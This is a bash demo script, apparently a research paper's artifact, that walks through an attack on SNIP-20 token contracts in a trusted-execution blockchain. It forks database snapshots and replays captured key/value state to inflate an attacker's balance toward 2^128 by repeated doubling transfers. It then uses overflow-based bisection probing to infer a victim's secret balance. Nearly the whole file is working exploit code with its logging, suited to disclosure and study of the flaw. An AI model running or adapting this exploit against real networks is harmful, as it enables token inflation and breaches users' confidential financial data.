#!/bin/bash

set -e

source ./scripts/demo_utils.sh
source ./scripts/local_test_params.sh

attacker1=${ACC0}
attacker2=${ACC1}
victim=${ACC2}

echo
teebox info-panel "Artifact for Section 5.5" --title "Querying SNIP-20 account balances"

echo
teebox info-panel $'[bold]Victimo :innocent:[/]: User whose secret balance is being spied on\n[bold]Atako :rage:[/]: Attacker who can modify the untrusted code base and simulate transactions and controls two addresses' --title "Cast of Characters"

echo
teebox log "Victim (Victimo :innocent:) address=${victim}, balance=12343"
teebox log "Attacker (Atako :rage:) first address=${attacker1}, balance=10000"
teebox log "Attacker (Atako :rage:) second address=${attacker2}, balance=10000"

CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
CODE_HASH=$(cat $BACKUP/codeHash.txt)

snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-start ..."

teebox log "Fork()    [light_goldenrod1]# set snapshot of database ${snapshot_uniq_label}-start[/]"
set_snapshot "${snapshot_uniq_label}-start"

# victim is the victim
rm -f $BACKUP/victim_key
rm -f $BACKUP/adv_key
rm -f $BACKUP/adv_value
touch $BACKUP/victim_key
touch $BACKUP/adv_key
touch $BACKUP/adv_value

# get boosting key and value
teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get boosting key and value ..."
teebox log "get boosting key and value"
generate_and_sign_transfer ${attacker2} ${attacker1} 1 snip20_getkey
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store

teebox log "[bold]Simulate(Transfer(attacker_addr1, attacker_addr2, 1))[/]"
simulate_tx snip20_getkey

res=$(cat $BACKUP/simulate_result)
echo $res
teebox log "result of simulate_tx snip20_getkey ${res}"
tag=$(sed '5q;d' $BACKUP/kv_store)
key=${tag:6:-1}
tag=$(sed '6q;d' $BACKUP/kv_store)
value=${tag:8:-1}
teebox log "key=${key}"
teebox log "value=${value}"

# boost balance of attacker2
echo $key > $BACKUP/backup_adv_key
echo $value > $BACKUP/backup_adv_value

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-boost ..."
teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/] ${snapshot_uniq_label}-boost"
set_snapshot "${snapshot_uniq_label}-boost"
amount=10000

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start Balance Inflation Attack ..."
for i in {1..114}; do
    teebox log "iteration=${i}"
    teebox log "amount=${amount}"
    echo

    generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_boost_1
    cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
    cp -f $BACKUP/backup_adv_value $BACKUP/adv_value

    simulate_tx snip20_boost_1
    res1=$(cat $BACKUP/simulate_result)
    #echo $res1

    amount=$(echo $(python -c "print ${amount}*2"))
    generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_2
    rm -f $BACKUP/adv_key
    rm -f $BACKUP/adv_value
    touch $BACKUP/adv_key
    touch $BACKUP/adv_value

    rm -f $BACKUP/kv_store
    touch $BACKUP/kv_store
    simulate_tx snip20_boost_2
    res2=$(cat $BACKUP/simulate_result)
    #echo $res2
    tag=$(sed '4q;d' $BACKUP/kv_store)
    #echo $tag
    value=${tag:8:-1} 
    echo $value > $BACKUP/backup_adv_value

    #echo $amount $i
    #_amount=$(echo $(python -c "print 2**128-1-${amount}"))
    #teebox log "_amount=${_amount}"
done

amount=$(echo $(python -c "print 2**128-1-${amount}"))
generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_1
cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
cp -f $BACKUP/backup_adv_value $BACKUP/adv_value

simulate_tx snip20_boost_1
res3=$(cat $BACKUP/simulate_result)
#echo $res3

# probe victim balance
amount=$(echo $(python -c "print 2**128-1"))
generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store
simulate_tx snip20_getkey
res4=$(cat $BACKUP/simulate_result)
#echo $res4
tag=$(sed '3q;d' $BACKUP/kv_store)
key=${tag:6:-1}
tag=$(sed '4q;d' $BACKUP/kv_store)
value=${tag:8:-1}

echo $key > $BACKUP/backup_adv_key
echo $value > $BACKUP/backup_adv_value

low=0
#high=$(echo $(python -c "print 2**128-1"))
high=$(bc <<< "2^128 - 1")
cnt=0

echo
teebox info-panel "Through a bisection search, we simulate transactions that transfer a probe amount [bold yellow]P[/] from the attacker's account to the victim's account. A transaction succeeds if the victim's balance [bold yellow]B[/] < 2^128 - [bold yellow]P[/], and fails otherwise." --title "Probing Victim's Balance"

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start probing victim's balance ..."

while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
#while [ $(echo $(python -c "print ${high}-${low}")) != "0" ]; do
    probe=$(bc <<< "(${high} + ${low} + 1) / 2" )
    echo
    teebox log "iteration=${cnt}"
    teebox log "low=${low}"
    teebox log "high=${high}"
    teebox log "probe=${probe}"

    cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
    cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
    set_snapshot "${snapshot_uniq_label}-${cnt}"
    
    teebox log "[bold]Simulate(Transfer(attacker, victim, probe=${probe}))[/]"
    generate_and_sign_transfer ${attacker2} ${victim} ${probe} snip20_adv
    simulate_tx snip20_adv
    simulate_tx_result=$(cat $BACKUP/simulate_result)

    # Assumes exit code 0, meaning successful, and exit code 1, meaning failure (overflow)
    if [ ${simulate_tx_result} != 0 ]; then
        high=$(bc <<< "${probe} - 1");
        teebox log "Transaction simulation [red]failed[/], [bold yellow]probe[/] is too high ([bold yellow]probe[/] + [bold yellow]B[/] >= 2^128)"
        teebox log "Decrease next [bold yellow]probe[/] amount by setting [bold]high[/]=([bold][yellow]probe[/]-1)=${high}[/]"
        balance_floor=$(bc <<< "2^128 - ${probe}")
        teebox log "Balance [bold yellow]B[/] >= ${balance_floor}"
    else
        low=${probe};
        teebox log "Transaction simulation [green]succeeded[/], [bold yellow]probe[/] is low enough ([bold yellow]probe[/] + [bold yellow]B[/] < 2^128)"
        teebox log "Increase next [bold yellow]probe[/] amount by setting [bold]low[/]=([bold][yellow]probe[/])=${probe}[/]"
        balance_ceiling=$(bc <<< "2^128 - ${probe}")
        teebox log "Balance [bold yellow]B[/] < ${balance_ceiling}"
    fi

    cnt=$((cnt + 1))
done

balance=$(bc <<< "2^128 - 1 - ${low}")
teebox log "Victim's :innocent: inferred balance=${balance}"
